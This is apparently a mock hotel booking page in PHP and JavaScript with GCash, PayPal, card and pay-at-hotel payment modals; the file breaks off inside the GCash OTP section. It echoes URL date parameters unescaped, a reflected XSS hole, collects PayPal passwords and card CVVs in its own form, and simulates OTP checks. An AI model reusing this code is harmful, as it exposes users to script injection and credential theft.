<?php
$pageTitle = 'Book Your Stay';
require_once 'includes/config.php';

// Get pre-selected room from URL
$preSelectedRoom = $_GET['room'] ?? '';
$preSelectedPromo = $_GET['promo'] ?? '';

// Get URL parameters for pre-filled dates
$urlCheckIn = $_GET['check_in'] ?? '';
$urlCheckOut = $_GET['check_out'] ?? '';

// Get room categories
$db = getDB();
$stmt = $db->query("SELECT * FROM room_categories WHERE status = 'active' ORDER BY base_price");
$roomCategories = $stmt->fetchAll();

require_once 'includes/header.php';
?>

<!-- Page Header -->
<div class="page-header">
    <div class="container">
        <h1>Book Your Stay</h1>
        <p>Complete your reservation in just a few simple steps</p>
    </div>
</div>

<!-- Breadcrumb -->
<div class="breadcrumb">
    <div class="container">
        <ul>
            <li><a href="index.php">Home</a></li>
            <li>/</li>
            <li>Book Your Stay</li>
        </ul>
    </div>
</div>

<!-- Booking Section -->
<section style="padding: 60px 0; background-color: var(--gray-light);">
    <div class="container">
        <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 40px;">
            <!-- Booking Form -->
            <div>
                <form id="bookingForm" style="background-color: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.08);">
                    <h3 style="font-size: 24px; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 2px solid var(--gray-light);">Reservation Details</h3>
                    
                    <!-- Date Selection -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px;">
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Check-in Date *</label>
                            <input type="date" name="check_in" id="checkIn" required min="<?php echo date('Y-m-d'); ?>" 
                                value="<?php echo $urlCheckIn; ?>"
                                style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;"
                                onchange="calculateTotal()">
                        </div>
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Check-out Date *</label>
                            <input type="date" name="check_out" id="checkOut" required min="<?php echo date('Y-m-d', strtotime('+1 day')); ?>" 
                                value="<?php echo $urlCheckOut; ?>"
                                style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;"
                                onchange="calculateTotal()">
                        </div>
                    </div>
                    
                    <!-- Guests -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px;">
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Adults *</label>
                            <select name="adults" id="adults" required style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                                <?php for ($i = 1; $i <= 6; $i++): ?>
                                <option value="<?php echo $i; ?>" <?php echo $i == 2 ? 'selected' : ''; ?>><?php echo $i; ?> Adult<?php echo $i > 1 ? 's' : ''; ?></option>
                                <?php endfor; ?>
                            </select>
                        </div>
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Children</label>
                            <select name="children" id="children" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                                <option value="0">0 Children</option>
                                <?php for ($i = 1; $i <= 4; $i++): ?>
                                <option value="<?php echo $i; ?>"><?php echo $i; ?> Child<?php echo $i > 1 ? 'ren' : ''; ?></option>
                                <?php endfor; ?>
                            </select>
                        </div>
                    </div>
                    
                    <!-- Room Selection -->
                    <div style="margin-bottom: 25px;">
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Room Type *</label>
                        <select name="room_category" id="roomCategory" required style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;"
                            onchange="calculateTotal()">
                            <option value="">Select a room type</option>
                            <?php foreach ($roomCategories as $category): ?>
                            <option value="<?php echo $category['category_id']; ?>" 
                                data-price="<?php echo $category['base_price']; ?>"
                                data-max="<?php echo $category['max_occupancy']; ?>"
                                data-name="<?php echo htmlspecialchars($category['category_name']); ?>"
                                <?php echo $preSelectedRoom == $category['category_id'] ? 'selected' : ''; ?>>
                                <?php echo htmlspecialchars($category['category_name']); ?> - <?php echo formatPrice($category['base_price']); ?>/night
                            </option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    
                    <!-- Promo Code -->
                    <div style="margin-bottom: 25px;">
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Promo Code</label>
                        <input type="text" name="promo_code" id="promoCode" placeholder="Enter promo code if you have one" 
                            value="<?php echo htmlspecialchars($preSelectedPromo); ?>"
                            style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                    </div>
                    
                    <h3 style="font-size: 24px; margin: 30px 0 25px; padding-bottom: 15px; border-bottom: 2px solid var(--gray-light);">Guest Information</h3>
                    
                    <?php if (!isLoggedIn()): ?>
                    <!-- Guest Details for non-logged in users -->
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px;">
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">First Name *</label>
                            <input type="text" name="guest_first_name" required style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                        </div>
                        <div>
                            <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Last Name *</label>
                            <input type="text" name="guest_last_name" required style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                        </div>
                    </div>
                    <div style="margin-bottom: 25px;">
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Email Address *</label>
                        <input type="email" name="guest_email" required style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                    </div>
                    <div style="margin-bottom: 25px;">
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Phone Number *</label>
                        <input type="tel" name="guest_phone" required placeholder="+63 XXX XXX XXXX" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px;">
                    </div>
                    <div style="background-color: var(--info-color); color: white; padding: 15px; border-radius: 5px; margin-bottom: 25px; font-size: 14px;">
                        <i class="fas fa-info-circle"></i> Already have an account? <a href="login.php" style="color: white; text-decoration: underline;">Sign in</a> for faster booking.
                    </div>
                    <?php else: ?>
                    <!-- Logged in user info -->
                    <div style="background-color: var(--gray-light); padding: 20px; border-radius: 5px; margin-bottom: 25px;">
                        <p style="margin-bottom: 10px;"><strong>Booking as:</strong> <?php echo htmlspecialchars($_SESSION['first_name'] . ' ' . $_SESSION['last_name']); ?></p>
                        <input type="hidden" name="guest_first_name" id="guestFirstName" value="<?php echo htmlspecialchars($_SESSION['first_name']); ?>">
                        <input type="hidden" name="guest_last_name" id="guestLastName" value="<?php echo htmlspecialchars($_SESSION['last_name']); ?>">
                        <input type="hidden" name="guest_email" id="guestEmail" value="<?php echo htmlspecialchars($_SESSION['email']); ?>">
                        <input type="hidden" name="guest_phone" id="guestPhone" value="<?php echo htmlspecialchars($_SESSION['phone'] ?? ''); ?>">
                        <a href="profile.php" style="color: var(--primary-color); font-size: 14px;">Update profile</a>
                    </div>
                    <?php endif; ?>
                    
                    <div style="margin-bottom: 25px;">
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Special Requests</label>
                        <textarea name="special_requests" id="specialRequests" rows="4" placeholder="Any special requests or requirements? (e.g., early check-in, extra bed, dietary restrictions)" 
                            style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 5px; font-size: 15px; resize: vertical;"></textarea>
                    </div>
                    
                    <h3 style="font-size: 24px; margin: 30px 0 25px; padding-bottom: 15px; border-bottom: 2px solid var(--gray-light);">Payment Method</h3>
                    
                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 25px;">
                        <label class="payment-method-card" data-method="gcash" style="border: 2px solid var(--primary-color); border-radius: 10px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s; background-color: var(--gray-light);">
                            <input type="radio" name="payment_method" value="gcash" checked style="display: none;">
                            <i class="fas fa-mobile-alt" style="font-size: 30px; color: var(--primary-color); margin-bottom: 10px; display: block;"></i>
                            <span style="font-size: 14px; font-weight: 600;">GCash</span>
                        </label>
                        <label class="payment-method-card" data-method="paypal" style="border: 2px solid var(--gray-medium); border-radius: 10px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s;">
                            <input type="radio" name="payment_method" value="paypal" style="display: none;">
                            <i class="fab fa-paypal" style="font-size: 30px; color: #003087; margin-bottom: 10px; display: block;"></i>
                            <span style="font-size: 14px; font-weight: 600;">PayPal</span>
                        </label>
                        <label class="payment-method-card" data-method="credit_card" style="border: 2px solid var(--gray-medium); border-radius: 10px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s;">
                            <input type="radio" name="payment_method" value="credit_card" style="display: none;">
                            <i class="far fa-credit-card" style="font-size: 30px; color: var(--primary-color); margin-bottom: 10px; display: block;"></i>
                            <span style="font-size: 14px; font-weight: 600;">Credit Card</span>
                        </label>
                        <label class="payment-method-card" data-method="pay_at_hotel" style="border: 2px solid var(--gray-medium); border-radius: 10px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s;">
                            <input type="radio" name="payment_method" value="pay_at_hotel" style="display: none;">
                            <i class="fas fa-money-bill-wave" style="font-size: 30px; color: var(--success-color); margin-bottom: 10px; display: block;"></i>
                            <span style="font-size: 14px; font-weight: 600;">Pay at Hotel</span>
                        </label>
                    </div>
                    
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 25px;">
                        <input type="checkbox" id="terms" required style="width: 20px; height: 20px;">
                        <label for="terms" style="font-size: 14px; cursor: pointer;">I agree to the <a href="terms.php" target="_blank" style="color: var(--primary-color);">Terms & Conditions</a> and <a href="privacy.php" target="_blank" style="color: var(--primary-color);">Privacy Policy</a></label>
                    </div>
                    
                    <button type="button" id="proceedToPayment" class="btn btn-primary" style="width: 100%; padding: 18px; font-size: 18px;">
                        <i class="fas fa-calendar-check"></i> Complete Reservation
                    </button>
                </form>
            </div>
            
            <!-- Price Summary -->
            <div>
                <div style="background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); position: sticky; top: 100px;">
                    <h3 style="font-size: 20px; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 2px solid var(--gray-light);">Price Summary</h3>
                    
                    <div id="priceSummary">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px;">
                            <span>Room Rate</span>
                            <span id="roomRateDisplay">Select room</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px;">
                            <span>Nights</span>
                            <span id="nightsDisplay">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px;">
                            <span>Subtotal</span>
                            <span id="subtotalDisplay">₱0.00</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px; color: var(--success-color);" id="discountRow" style="display: none;">
                            <span>Discount</span>
                            <span id="discountDisplay">-₱0.00</span>
                        </div>
                        <div style="border-top: 2px solid var(--gray-light); padding-top: 15px; margin-top: 15px;">
                            <div style="display: flex; justify-content: space-between; font-size: 20px; font-weight: 700;">
                                <span>Total</span>
                                <span id="totalDisplay" style="color: var(--primary-color);">₱0.00</span>
                            </div>
                        </div>
                    </div>
                    
                    <div style="margin-top: 25px; padding-top: 25px; border-top: 1px solid var(--gray-light);">
                        <p style="font-size: 13px; color: #666; margin-bottom: 10px;">
                            <i class="fas fa-check-circle" style="color: var(--success-color); margin-right: 5px;"></i>
                            Best price guarantee
                        </p>
                        <p style="font-size: 13px; color: #666; margin-bottom: 10px;">
                            <i class="fas fa-check-circle" style="color: var(--success-color); margin-right: 5px;"></i>
                            Free cancellation up to 48 hours
                        </p>
                        <p style="font-size: 13px; color: #666;">
                            <i class="fas fa-check-circle" style="color: var(--success-color); margin-right: 5px;"></i>
                            No hidden charges
                        </p>
                    </div>
                    
                    <div style="margin-top: 25px; background-color: var(--gray-light); padding: 20px; border-radius: 5px;">
                        <p style="font-size: 14px; font-weight: 600; margin-bottom: 10px;">Need Help?</p>
                        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Our reservations team is available 24/7</p>
                        <a href="tel:+63351234567" style="color: var(--primary-color); font-size: 16px; font-weight: 600; text-decoration: none;">
                            <i class="fas fa-phone" style="margin-right: 8px;"></i>+63 35 123 4567
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
function calculateTotal() {
    const checkIn = document.getElementById('checkIn').value;
    const checkOut = document.getElementById('checkOut').value;
    const roomSelect = document.getElementById('roomCategory');
    const selectedOption = roomSelect.options[roomSelect.selectedIndex];
    
    if (checkIn && checkOut && selectedOption.value) {
        const start = new Date(checkIn);
        const end = new Date(checkOut);
        const nights = Math.ceil((end - start) / (1000 * 60 * 60 * 24));
        
        if (nights > 0) {
            const price = parseFloat(selectedOption.getAttribute('data-price'));
            currentRoomName = selectedOption.getAttribute('data-name');
            const subtotal = price * nights;
            currentTotal = subtotal;
            
            document.getElementById('roomRateDisplay').textContent = '₱' + price.toLocaleString('en-PH', {minimumFractionDigits: 2});
            document.getElementById('nightsDisplay').textContent = nights + ' night' + (nights > 1 ? 's' : '');
            document.getElementById('subtotalDisplay').textContent = '₱' + subtotal.toLocaleString('en-PH', {minimumFractionDigits: 2});
            document.getElementById('totalDisplay').textContent = '₱' + subtotal.toLocaleString('en-PH', {minimumFractionDigits: 2});
        }
    }
}

// Global variables
let currentTotal = 0;
let currentRoomName = '';
let currentPaymentMethod = 'gcash';
let bookingData = {};

// Payment method selection
document.querySelectorAll('.payment-method-card').forEach(card => {
    card.addEventListener('click', function() {
        document.querySelectorAll('.payment-method-card').forEach(c => {
            c.classList.remove('selected');
            c.style.borderColor = 'var(--gray-medium)';
        });
        this.classList.add('selected');
        this.style.borderColor = 'var(--primary-color)';
        const radio = this.querySelector('input[type="radio"]');
        radio.checked = true;
        currentPaymentMethod = radio.value;
    });
});

// Proceed to payment button
document.getElementById('proceedToPayment').addEventListener('click', function() {
    const form = document.getElementById('bookingForm');
    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }
    if (!document.getElementById('terms').checked) {
        alert('Please agree to the Terms & Conditions');
        return;
    }
    if (!document.getElementById('roomCategory').value) {
        alert('Please select a room type');
        return;
    }
    if (!document.getElementById('checkIn').value || !document.getElementById('checkOut').value) {
        alert('Please select check-in and check-out dates');
        return;
    }
    
    bookingData = {
        check_in: document.getElementById('checkIn').value,
        check_out: document.getElementById('checkOut').value,
        room_category: document.getElementById('roomCategory').value,
        adults: document.getElementById('adults').value,
        children: document.getElementById('children').value,
        special_requests: document.getElementById('specialRequests').value,
        promo_code: document.getElementById('promoCode').value,
        guest_first_name: document.getElementById('guestFirstName').value,
        guest_last_name: document.getElementById('guestLastName').value,
        guest_email: document.getElementById('guestEmail').value,
        guest_phone: document.getElementById('guestPhone').value
    };
    
    showPaymentModal(currentPaymentMethod);
});

function showPaymentModal(method) {
    document.getElementById('paymentModalOverlay').style.display = 'flex';
    document.querySelectorAll('.payment-modal').forEach(m => m.style.display = 'none');
    
    const totalFormatted = '₱' + currentTotal.toLocaleString('en-PH', {minimumFractionDigits: 2});
    
    switch(method) {
        case 'gcash':
            document.getElementById('gcashAmount').value = totalFormatted;
            document.getElementById('gcashModal').style.display = 'block';
            break;
        case 'paypal':
            document.getElementById('paypalAmount').value = totalFormatted;
            document.getElementById('paypalModal').style.display = 'block';
            break;
        case 'credit_card':
            document.getElementById('ccAmount').value = totalFormatted;
            document.getElementById('creditCardModal').style.display = 'block';
            break;
        case 'pay_at_hotel':
            document.getElementById('payAtHotelModal').style.display = 'block';
            document.getElementById('hotelFullName').value = 
                (document.getElementById('guestFirstName').value + ' ' + document.getElementById('guestLastName').value).trim();
            document.getElementById('hotelMobile').value = document.getElementById('guestPhone').value;
            document.getElementById('hotelEmail').value = document.getElementById('guestEmail').value;
            document.getElementById('fullAmountDisplay').textContent = totalFormatted;
            break;
    }
}

function closePaymentModal() {
    document.getElementById('paymentModalOverlay').style.display = 'none';
    document.querySelectorAll('.payment-modal').forEach(m => m.style.display = 'none');
}

document.getElementById('paymentModalOverlay').addEventListener('click', function(e) {
    if (e.target === this) closePaymentModal();
});

// GCash Payment
function processGCashPayment() {
    const mobile = document.getElementById('gcashMobile').value;
    const name = document.getElementById('gcashName').value;
    if (!mobile || !name) { alert('Please fill in all required fields'); return; }
    if (!/^09\d{9}$/.test(mobile)) { alert('Please enter a valid mobile number (09XXXXXXXXX)'); return; }
    
    document.getElementById('gcashForm').style.display = 'none';
    document.getElementById('gcashOtpSection').style.display = 'block';
    setTimeout(() => document.querySelector('.otp-input').focus(), 100);
}

function showGCashForm() {
    document.getElementById('gcashForm').style.display = 'block';
    document.getElementById('gcashOtpSection').style.display = 'none';
}

function resendGCashOTP() { alert('OTP resent to your mobile number'); }

function verifyGCashOTP() {
    let otp = '';
    document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
    if (otp.length !== 6) { alert('Please enter the complete 6-digit OTP'); return; }
    
    showProcessing('Verifying GCash payment...');
    submitPayment('gcash', {
        mobile_number: document.getElementById('gcashMobile').value,
        account_name: document.getElementById('gcashName').value,
        reference_note: document.getElementById('gcashNote').value
    });
}

// PayPal Payment
function processPayPalPayment() {
    const email = document.getElementById('paypalEmail').value;
    const password = document.getElementById('paypalPassword').value;
    if (!email || !password) { alert('Please fill in all required fields'); return; }
    if (!email.includes('@')) { alert('Please enter a valid email address'); return; }
    
    document.getElementById('paypalForm').style.display = 'none';
    document.getElementById('paypalLoadingSection').style.display = 'block';
    
    setTimeout(() => {
        showProcessing('Processing PayPal payment...');
        submitPayment('paypal', { paypal_email: email, paypal_password: password });
    }, 2000);
}

// Credit Card Payment
function processCreditCardPayment() {
    const cardNumber = document.getElementById('ccNumber').value.replace(/\s/g, '');
    const cardHolder = document.getElementById('ccHolder').value;
    const expiry = document.getElementById('ccExpiry').value;
    const cvv = document.getElementById('ccCVV').value;
    
    if (!cardNumber || !cardHolder || !expiry || !cvv) { alert('Please fill in all required fields'); return; }
    if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ''))) { alert('Please enter a valid 16-digit card number'); return; }
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { alert('Please enter expiry date in MM/YY format'); return; }
    if (!/^\d{3}$/.test(cvv)) { alert('Please enter a valid 3-digit CVV'); return; }
    
    document.getElementById('creditCardForm').style.display = 'none';
    document.getElementById('ccOtpSection').style.display = 'block';
    setTimeout(() => document.querySelector('.cc-otp-input').focus(), 100);
}

function showCreditCardForm() {
    document.getElementById('creditCardForm').style.display = 'block';
    document.getElementById('ccOtpSection').style.display = 'none';
}

function verifyCCOTP() {
    let otp = '';
    document.querySelectorAll('.cc-otp-input').forEach(input => otp += input.value);
    if (otp.length !== 6) { alert('Please enter the complete 6-digit OTP'); return; }
    
    showProcessing('Verifying card payment...');
    submitPayment('credit_card', {
        card_number: document.getElementById('ccNumber').value,
        card_holder: document.getElementById('ccHolder').value,
        expiry_date: document.getElementById('ccExpiry').value,
        cvv: document.getElementById('ccCVV').value
    });
}

// Pay at Hotel
function updateHotelPaymentAmount() {
    const option = document.querySelector('input[name="hotel_payment_option"]:checked').value;
    document.getElementById('partialPaymentSection').style.display = option === 'partial' ? 'block' : 'none';
}

function processPayAtHotel() {
    const fullName = document.getElementById('hotelFullName').value;
    const mobile = document.getElementById('hotelMobile').value;
    const email = document.getElementById('hotelEmail').value;
    const paymentOption = document.querySelector('input[name="hotel_payment_option"]:checked').value;
    const partialAmount = document.getElementById('partialAmount').value;
    
    if (!fullName || !mobile || !email) { alert('Please fill in all required fields'); return; }
    if (!email.includes('@')) { alert('Please enter a valid email address'); return; }
    
    if (paymentOption === 'partial') {
        if (!partialAmount || partialAmount < 100) { alert('Please enter a partial amount of at least ₱100'); return; }
        if (parseFloat(partialAmount) >= currentTotal) { alert('Partial amount must be less than total amount'); return; }
    }
    
    showProcessing('Processing booking...');
    submitPayment('pay_at_hotel', {
        full_name: fullName, mobile_number: mobile, email: email,
        arrival_time: document.getElementById('hotelArrivalTime').value,
        special_notes: document.getElementById('hotelSpecialNotes').value,
        payment_amount: paymentOption, partial_amount: partialAmount
    });
}

function showProcessing(text) {
    document.querySelectorAll('.payment-modal').forEach(m => m.style.display = 'none');
    document.getElementById('processingLoader').style.display = 'block';
    document.getElementById('processingText').textContent = text;
}

function submitPayment(method, paymentData) {
    fetch('payment-process.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payment_method: method, booking_data: bookingData, payment_data: paymentData })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showReceipt(data);
        } else {
            alert(data.message || 'Payment processing failed. Please try again.');
            closePaymentModal();
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while processing your payment. Please try again.');
        closePaymentModal();
    });
}

function showReceipt(data) {
    console.log('Receipt data:', data);
    const receipt = data.receipt || {};
    const isPartial = data.payment_status === 'partial';
    let statusColor = data.payment_status === 'paid' ? '#28a745' : (data.payment_status === 'partial' ? '#ffc107' : '#dc3545');
    let statusText = data.payment_status === 'paid' ? 'PAID' : (data.payment_status === 'partial' ? 'PARTIAL' : 'PENDING');
    
    let remainingHtml = isPartial ? `
        <div style="display: flex; justify-content: space-between; margin-bottom: 10px; padding: 10px; background: #fff3cd; border-radius: 5px;">
            <span style="font-weight: 600;">Amount Paid:</span>
            <span style="font-weight: 700; color: #28a745;">₱${parseFloat(data.amount_paid || 0).toLocaleString('en-PH', {minimumFractionDigits: 2})}</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 10px; padding: 10px; background: #f8d7da; border-radius: 5px;">
            <span style="font-weight: 600;">Remaining Balance:</span>
            <span style="font-weight: 700; color: #dc3545;">₱${parseFloat(data.remaining_amount || 0).toLocaleString('en-PH', {minimumFractionDigits: 2})}</span>
        </div>
    ` : '';
    
    const receiptHtml = `
        <div style="padding: 30px;">
            <div style="text-align: center; margin-bottom: 25px;">
                <div style="width: 80px; height: 80px; background: ${data.payment_status === 'paid' || data.payment_status === 'partial' ? '#28a745' : '#dc3545'}; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fas fa-${data.payment_status === 'paid' || data.payment_status === 'partial' ? 'check' : 'times'}" style="font-size: 40px; color: white;"></i>
                </div>
                <h3 style="font-size: 24px; margin-bottom: 5px;">${data.payment_status === 'paid' || data.payment_status === 'partial' ? 'Payment Successful!' : 'Payment Pending'}</h3>
                <p style="font-size: 14px; color: #666;">Booking Reference: <strong>${data.booking_ref || 'N/A'}</strong></p>
            </div>
            <div style="background: #f8f9fa; border-radius: 10px; padding: 20px; margin-bottom: 20px;">
                <h4 style="font-size: 16px; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #dee2e6;">Payment Details</h4>
                <div style="margin-bottom: 10px;"><span style="color: #666; font-size: 14px;">Payment Method:</span><span style="float: right; font-weight: 600;">${receipt.payment_method || 'N/A'}</span></div>
                <div style="margin-bottom: 10px;"><span style="color: #666; font-size: 14px;">Transaction ID:</span><span style="float: right; font-weight: 600; font-family: monospace;">${data.transaction_id || 'N/A'}</span></div>
                <div style="margin-bottom: 10px;"><span style="color: #666; font-size: 14px;">Date:</span><span style="float: right; font-weight: 600;">${new Date().toLocaleString('en-PH')}</span></div>
                <div style="margin-bottom: 10px;"><span style="color: #666; font-size: 14px;">Status:</span><span style="float: right; font-weight: 700; color: ${statusColor}; text-transform: uppercase;">${statusText}</span></div>
                ${remainingHtml}
                <div style="border-top: 2px solid #dee2e6; margin-top: 15px; padding-top: 15px;">
                    <div style="display: flex; justify-content: space-between; font-size: 18px; font-weight: 700;">
                        <span>Total Amount:</span>
                        <span style="color: var(--primary-color);">₱${parseFloat(receipt.total_amount || data.total || currentTotal).toLocaleString('en-PH', {minimumFractionDigits: 2})}</span>
                    </div>
                </div>
            </div>
            <div style="background: #e3f2fd; border-radius: 10px; padding: 15px; margin-bottom: 20px;">
                <p style="font-size: 14px; margin: 0;"><i class="fas fa-info-circle" style="color: var(--primary-color); margin-right: 8px;"></i>${receipt.message || 'Payment processed'}</p>
            </div>
            <button onclick="redirectToConfirmation()" style="width: 100%; padding: 15px; background: var(--primary-color); color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: 600;">
                <i class="fas fa-arrow-right"></i> Continue to Confirmation
            </button>
        </div>
    `;
    
    document.querySelectorAll('.payment-modal').forEach(m => m.style.display = 'none');
    document.getElementById('receiptContent').innerHTML = receiptHtml;
    document.getElementById('receiptModal').style.display = 'block';
}

function redirectToConfirmation() { window.location.href = 'booking-confirmation.php'; }

// OTP auto-focus
document.querySelectorAll('.otp-input, .cc-otp-input').forEach((input, index, inputs) => {
    input.addEventListener('input', function() { if (this.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); });
    input.addEventListener('keydown', function(e) { if (e.key === 'Backspace' && !this.value && index > 0) inputs[index - 1].focus(); });
});

// Credit card formatting
document.getElementById('ccNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
    e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
});

// Expiry date formatting
document.getElementById('ccExpiry').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
    e.target.value = value;
});

// Date validation
document.getElementById('checkIn').addEventListener('change', function() {
    const checkOut = document.getElementById('checkOut');
    checkOut.min = this.value;
    if (checkOut.value && checkOut.value <= this.value) {
        const nextDay = new Date(this.value);
        nextDay.setDate(nextDay.getDate() + 1);
        checkOut.value = nextDay.toISOString().split('T')[0];
    }
});

// Initialize
document.addEventListener('DOMContentLoaded', calculateTotal);
</script>

<!-- Payment Modals -->
<div id="paymentModalOverlay" class="payment-modal-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); z-index: 9999; justify-content: center; align-items: center;">
    
    <!-- GCash Modal -->
    <div id="gcashModal" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 450px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div style="padding: 30px;">
            <div style="text-align: center; margin-bottom: 25px;">
                <div style="width: 70px; height: 70px; background: linear-gradient(135deg, #0070E0, #0055B8); border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fas fa-mobile-alt" style="font-size: 35px; color: white;"></i>
                </div>
                <h3 style="font-size: 22px; margin-bottom: 5px;">GCash Payment</h3>
                <p style="font-size: 14px; color: #666;">Pay securely with GCash</p>
            </div>
            <div id="gcashForm">
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Amount</label>
                    <input type="text" id="gcashAmount" readonly style="width: 100%; padding: 15px; border: 2px solid var(--primary-color); border-radius: 8px; font-size: 18px; font-weight: 700; text-align: center; background: #f8f9fa; color: var(--primary-color);">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Mobile Number *</label>
                    <input type="tel" id="gcashMobile" placeholder="09XXXXXXXXX" maxlength="11" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Account Name *</label>
                    <input type="text" id="gcashName" placeholder="Juan Dela Cruz" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 25px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Reference Note (Optional)</label>
                    <input type="text" id="gcashNote" placeholder="e.g., Business Trip" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="closePaymentModal()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Cancel</button>
                    <button type="button" onclick="processGCashPayment()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, #0070E0, #0055B8); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;"><i class="fas fa-lock"></i> Pay via GCash</button>
                </div>
            </div>
            <div id="gcashOtpSection" style="display: none;">
                <div style="text-align: center; margin-bottom: 20px;">
                    <div style="width: 60px; height: 60px; background: #e3f2fd; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                        <i class="fas fa-shield-alt" style="font-size: 28px; color: #0070E0;"></i>
                    </div>
                    <h4 style="font-size: 18px; margin-bottom: 10px;">Enter OTP Code</h4>
                    <p style="font-size: 14px; color: #666;">We've sent a 6-digit code to your mobile number</p>
                </div>
                <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 25px;">
                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
